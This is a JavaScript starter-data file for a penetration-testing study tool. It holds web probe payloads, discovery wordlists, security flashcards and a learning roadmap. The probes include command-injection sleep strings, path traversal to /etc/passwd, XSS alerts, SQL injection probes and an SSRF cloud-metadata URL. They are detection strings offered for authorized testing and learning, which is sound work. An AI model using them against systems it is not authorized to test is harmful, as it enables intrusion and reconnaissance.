/*
  Cyber Desk — starter data: detection probes, wordlists, flashcards and the penetration testing roadmap.
  Probes are harmless detection strings (they show whether input is reflected, evaluated or fetched).
  Use them only against systems you are authorized to test.
  Browser: window.DeskData.   Node: module.exports.
*/
(function (root, factory) {
  const api = factory();
  if (typeof module === "object" && module.exports) module.exports = api;
  else root.DeskData = api;
})(typeof self !== "undefined" ? self : this, function () {
  "use strict";

  const PAYLOAD_CATEGORIES = [
    "XSS", "SQL Injection", "SSTI", "Path Traversal", "Command Injection",
    "SSRF", "Open Redirect", "Wordlist", "Other"
  ];

  const P = (title, category, body, note, tags) => ({ title, category, body, note, tags });

  const PAYLOAD_SEED = [
    P("XSS: basic reflection probe", "XSS", "<script>alert(document.domain)</script>",
      "Check whether tags are reflected without encoding", "xss,probe"),
    P("XSS: attribute breakout", "XSS", "\"><img src=x onerror=alert(document.domain)>",
      "Use when input lands inside an HTML attribute", "xss,probe"),
    P("XSS: SVG onload", "XSS", "<svg onload=alert(document.domain)>",
      "Alternative when <script> is filtered", "xss,probe"),
    P("XSS: unique marker", "XSS", "zq7x1\"'<>",
      "Search the response to see which characters are encoded or stripped", "xss,recon"),

    P("SQLi: single quote error probe", "SQL Injection", "'",
      "A database error or a changed response suggests unsanitized input", "sqli,probe"),
    P("SQLi: boolean pair (string context)", "SQL Injection", "' AND '1'='1\n' AND '1'='2",
      "Compare the two responses; a difference indicates injectable logic", "sqli,boolean"),
    P("SQLi: boolean pair (numeric context)", "SQL Injection", "1 AND 1=1\n1 AND 1=2",
      "Same idea when the parameter is not quoted", "sqli,boolean"),
    P("SQLi: time-based probe (MySQL)", "SQL Injection", "' AND SLEEP(5)-- -",
      "A consistent 5 second delay indicates blind injection", "sqli,time-based"),

    P("SSTI: arithmetic probes", "SSTI", "{{7*7}}\n${7*7}\n<%= 7*7 %>\n#{7*7}",
      "If 49 appears, the input is evaluated by a template engine", "ssti,probe"),

    P("Path traversal: Linux", "Path Traversal",
      "../../../../etc/passwd\n....//....//....//etc/passwd\n..%2f..%2f..%2fetc%2fpasswd",
      "Plain, filter-bypass and URL-encoded variants", "lfi,traversal"),
    P("Path traversal: Windows", "Path Traversal", "..\\..\\..\\windows\\win.ini\n..%5c..%5c..%5cwindows%5cwin.ini",
      "Backslash variants for Windows targets", "lfi,traversal"),

    P("Command injection: time-delay probes", "Command Injection",
      "; sleep 5\n| sleep 5\n&& sleep 5\n$(sleep 5)",
      "A consistent delay confirms command execution without needing output", "cmdi,time-based"),

    P("SSRF: loopback probes", "SSRF", "http://127.0.0.1/\nhttp://localhost/\nhttp://[::1]/",
      "Check whether the server fetches internal addresses", "ssrf,probe"),
    P("SSRF: cloud metadata endpoint", "SSRF", "http://169.254.169.254/latest/meta-data/",
      "Only test when cloud targets are explicitly in scope", "ssrf,cloud"),

    P("Open redirect: probes", "Open Redirect", "//example.com\nhttps://example.com\n/\\example.com",
      "Use on parameters such as next, url, redirect, returnTo", "redirect,probe"),

    P("Wordlist: common paths (mini)", "Wordlist",
      ["admin", "administrator", "login", "logout", "dashboard", "api", "api/v1", "backup", "backups", "config",
        "console", "debug", "dev", "test", "staging", "uploads", "files", "static", "assets", "docs",
        "swagger", "swagger-ui", "robots.txt", "sitemap.xml", ".well-known/security.txt"].join("\n"),
      "Starter list for directory discovery with ffuf or gobuster", "wordlist,content-discovery"),
    P("Wordlist: interesting files", "Wordlist",
      [".env", ".git/HEAD", ".git/config", ".svn/entries", ".DS_Store", ".htaccess", "web.config", "config.php.bak",
        "backup.zip", "backup.sql", "db.sql", "dump.sql", "phpinfo.php", "server-status", "crossdomain.xml",
        "package.json", "composer.json", "Dockerfile", "docker-compose.yml"].join("\n"),
      "Files that commonly leak configuration or source", "wordlist,content-discovery"),
    P("Wordlist: common parameter names", "Wordlist",
      ["id", "user", "uid", "page", "file", "path", "dir", "url", "uri", "redirect", "next", "return", "callback",
        "q", "query", "search", "name", "email", "token", "debug", "admin", "role", "lang", "template", "view"].join("\n"),
      "Starter list for parameter discovery", "wordlist,parameters"),
    P("Wordlist: common usernames", "Wordlist",
      ["admin", "administrator", "root", "user", "test", "guest", "support", "info", "dev", "backup"].join("\n"),
      "Use only inside the agreed scope and rate limits", "wordlist,usernames")
  ];

  const C = (title, body, tags) => ({ title, body, tags });

  const CARD_SEED = [
    C("Port 21 / TCP", "FTP. Check for anonymous login.", "ports"),
    C("Port 22 / TCP", "SSH. Check version and allowed auth methods.", "ports"),
    C("Port 23 / TCP", "Telnet. Unencrypted remote shell.", "ports"),
    C("Port 25 / TCP", "SMTP. Check for open relay and user enumeration (VRFY / EXPN).", "ports"),
    C("Port 53 / TCP+UDP", "DNS. Check for zone transfer (AXFR).", "ports"),
    C("Port 88 / TCP+UDP", "Kerberos. Indicates a Windows domain controller.", "ports"),
    C("Port 161 / UDP", "SNMP. Check for default community strings.", "ports"),
    C("Port 389 / TCP", "LDAP (LDAPS uses 636). Directory service, common in Active Directory.", "ports"),
    C("Port 445 / TCP", "SMB. Windows file sharing. Check for null sessions and exposed shares.", "ports"),
    C("Port 3389 / TCP", "RDP. Windows remote desktop.", "ports"),
    C("Port 6379 / TCP", "Redis. Check for missing authentication.", "ports"),

    C("CIA triad", "Confidentiality, Integrity, Availability.", "fundamentals"),
    C("Encoding vs encryption vs hashing",
      "Encoding: reversible format change, no secret (Base64).\nEncryption: reversible with a key (AES).\nHashing: one-way fingerprint (SHA-256).", "fundamentals,crypto"),
    C("Why salt passwords?", "A unique random salt per password defeats rainbow tables and stops identical passwords from producing identical hashes.", "crypto"),
    C("Least privilege", "Give each user and process only the access needed to do its job, nothing more.", "fundamentals"),
    C("Defense in depth", "Layer multiple independent controls so one failure does not lead to full compromise.", "fundamentals"),
    C("Rules of Engagement (RoE)", "Written authorization defining scope, allowed techniques, testing windows and emergency contacts. Never test without it.", "pentest,legal"),
    C("PTES phases", "Pre-engagement, Intelligence gathering, Threat modeling, Vulnerability analysis, Exploitation, Post-exploitation, Reporting.", "pentest,methodology"),
    C("MITRE ATT&CK Enterprise tactics",
      "Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, Impact.", "mitre,methodology"),
    C("CVSS 3.1 base metrics", "AV (Attack Vector), AC (Attack Complexity), PR (Privileges Required), UI (User Interaction), S (Scope), C / I / A (Confidentiality, Integrity, Availability impact).", "cvss"),

    C("XSS: three types", "Reflected, Stored, DOM-based.", "web,xss"),
    C("IDOR / BOLA", "Insecure Direct Object Reference: the app exposes an object ID and does not check that the caller is allowed to access that object.", "web,access-control"),
    C("CSRF defenses", "Anti-CSRF tokens, SameSite cookies, checking Origin / Referer, re-authentication for sensitive actions.", "web,csrf"),
    C("SQL injection: primary defense", "Parameterized queries (prepared statements). Add least-privilege DB accounts and input validation as extra layers.", "web,sqli"),
    C("SSRF: what is the impact?", "The server is tricked into making requests for the attacker, reaching internal services or cloud metadata that are not exposed publicly.", "web,ssrf"),
    C("HTTP 401 vs 403", "401: not authenticated. 403: authenticated (or understood) but not permitted.", "web,http"),
    C("Cookie security flags", "HttpOnly (hides from JavaScript), Secure (HTTPS only), SameSite (limits cross-site sending).", "web,session"),
    C("JWT: alg=none risk", "If the server accepts an unsigned token, anyone can forge claims. Always enforce the expected algorithm and verify the signature.", "web,jwt"),
    C("CORS misconfiguration", "Reflecting arbitrary Origin together with Access-Control-Allow-Credentials: true lets other sites read authenticated responses.", "web,cors")
  ];

  // Each phase: id, title, goal (Thai), items [[id, text]], links [[name, url]]
  const ROADMAP = [
    { id: "foundations", title: "Foundations",
      goal: "พื้นฐานที่ต้องแน่นก่อนเริ่มทดสอบระบบจริง",
      items: [
        ["f-net", "Networking: OSI / TCP-IP, subnetting, DNS, DHCP, ARP"],
        ["f-http", "HTTP / HTTPS and TLS: methods, headers, cookies, status codes"],
        ["f-linux", "Linux command line, file permissions, processes and services"],
        ["f-win", "Windows basics: users, services, registry, PowerShell"],
        ["f-script", "Scripting with Python and Bash for automation"],
        ["f-crypto", "Cryptography basics: hashing, symmetric / asymmetric, PKI"],
        ["f-lab", "Build a home lab: hypervisor, Kali Linux, intentionally vulnerable VMs"],
        ["f-law", "Legal and ethics: authorization, scope, Rules of Engagement"]
      ],
      links: [["OWASP", "https://owasp.org/"]] },
    { id: "tooling", title: "Tooling & Methodology",
      goal: "ฝึกใช้เครื่องมือหลักและทำงานเป็นขั้นตอน ไม่ใช่สุ่มลอง",
      items: [
        ["t-burp", "Burp Suite: Proxy, Repeater, Intruder"],
        ["t-nmap", "nmap: host discovery, port scan, service detection, NSE"],
        ["t-enum", "Content discovery: ffuf, gobuster, nikto"],
        ["t-meth", "Methodology: PTES, OWASP WSTG, MITRE ATT&CK"],
        ["t-notes", "Note-taking system and evidence capture (screenshots, request / response)"]
      ],
      links: [["OWASP WSTG", "https://owasp.org/www-project-web-security-testing-guide/"],
        ["MITRE ATT&CK", "https://attack.mitre.org/"], ["PTES", "http://www.pentest-standard.org/"]] },
    { id: "web", title: "Web Application Security",
      goal: "หมวดที่งาน pentest ส่วนใหญ่เจอ และเป็นจุดเริ่มต้นที่ดีที่สุด",
      items: [
        ["w-top10", "OWASP Top 10 and how each category appears in real apps"],
        ["w-inj", "Injection: SQL injection, command injection, SSTI"],
        ["w-xss", "XSS: reflected, stored, DOM-based"],
        ["w-auth", "Authentication and session management flaws"],
        ["w-ac", "Access control: IDOR / BOLA, privilege escalation, forced browsing"],
        ["w-ssrf", "SSRF, XXE, path traversal / LFI"],
        ["w-file", "File upload and insecure deserialization"],
        ["w-api", "API security testing: REST, GraphQL, JWT, mass assignment"],
        ["w-logic", "Business logic flaws and race conditions"]
      ],
      links: [["PortSwigger Web Security Academy", "https://portswigger.net/web-security"]] },
    { id: "network", title: "Network & Infrastructure",
      goal: "ทดสอบเครือข่ายและบริการต่าง ๆ นอกเหนือจากเว็บ",
      items: [
        ["n-enum", "Service enumeration: SMB, SNMP, FTP, SSH, SMTP, LDAP"],
        ["n-scan", "Vulnerability scanning and manual validation (Nessus, OpenVAS)"],
        ["n-pass", "Password attacks: wordlists, hash cracking, password spraying (authorized only)"],
        ["n-msf", "Metasploit and public exploits: use them responsibly and understand what they do"],
        ["n-pivot", "Pivoting and tunneling basics"],
        ["n-wire", "Traffic analysis with Wireshark"]
      ],
      links: [] },
    { id: "privesc", title: "Privilege Escalation & Post-Exploitation",
      goal: "เมื่อเข้าระบบได้แล้ว ต้องเข้าใจว่าไปต่อได้แค่ไหน",
      items: [
        ["p-linux", "Linux privilege escalation: SUID, sudo, cron, capabilities, kernel"],
        ["p-win", "Windows privilege escalation: services, tokens, misconfigurations"],
        ["p-post", "Post-exploitation: credential access, persistence concepts, cleanup"]
      ],
      links: [] },
    { id: "ad", title: "Active Directory",
      goal: "ส่วนสำคัญของงาน internal pentest ในองค์กรที่ใช้ Windows",
      items: [
        ["a-concept", "AD concepts: domain, forest, GPO, Kerberos, NTLM"],
        ["a-enum", "AD enumeration: LDAP queries, BloodHound"],
        ["a-paths", "Common attack paths: Kerberoasting, AS-REP roasting, delegation, ACL abuse"],
        ["a-lat", "Lateral movement concepts and how defenders detect them"]
      ],
      links: [] },
    { id: "practice", title: "Hands-on Practice",
      goal: "ทักษะเกิดจากการลงมือทำ ทำ lab ควบคู่ทุกเฟส",
      items: [
        ["x-thm", "TryHackMe learning paths (Pre Security, Jr Penetration Tester)"],
        ["x-psw", "PortSwigger Web Security Academy labs"],
        ["x-htb", "Hack The Box Starting Point and easy machines"],
        ["x-vuln", "Practice apps: DVWA, OWASP Juice Shop, WebGoat"],
        ["x-ctf", "Join CTF events and write a write-up for each challenge"]
      ],
      links: [["TryHackMe", "https://tryhackme.com/"], ["Hack The Box", "https://www.hackthebox.com/"],
        ["OWASP Juice Shop", "https://owasp.org/www-project-juice-shop/"]] },
    { id: "reporting", title: "Reporting & Professional Skills",
      goal: "รายงานที่ดีคือสิ่งที่ลูกค้าจ่ายเงินให้จริง ๆ",
      items: [
        ["r-find", "Write a clear finding: impact, evidence, reproduction steps, remediation"],
        ["r-cvss", "Rate risk with CVSS plus business context"],
        ["r-exec", "Executive summary vs technical detail"],
        ["r-retest", "Retest and verify fixes"],
        ["r-port", "Publish write-ups and build a portfolio"]
      ],
      links: [["CVSS", "https://www.first.org/cvss/"]] },
    { id: "certs", title: "Certifications (pick what fits your goal)",
      goal: "ไม่จำเป็นต้องครบทุกใบ เลือกตามเป้าหมายอาชีพและงบประมาณ",
      items: [
        ["c-sec", "CompTIA Security+ (fundamentals)"],
        ["c-ejpt", "eJPT (entry-level practical pentest)"],
        ["c-pnpt", "PNPT (practical network pentest)"],
        ["c-bscp", "BSCP: Burp Suite Certified Practitioner (web)"],
        ["c-oscp", "OSCP (well-known hands-on pentest certification)"],
        ["c-ceh", "CEH (theory-based, often recognized by HR)"]
      ],
      links: [] }
  ];

  return { PAYLOAD_CATEGORIES, PAYLOAD_SEED, CARD_SEED, ROADMAP };
});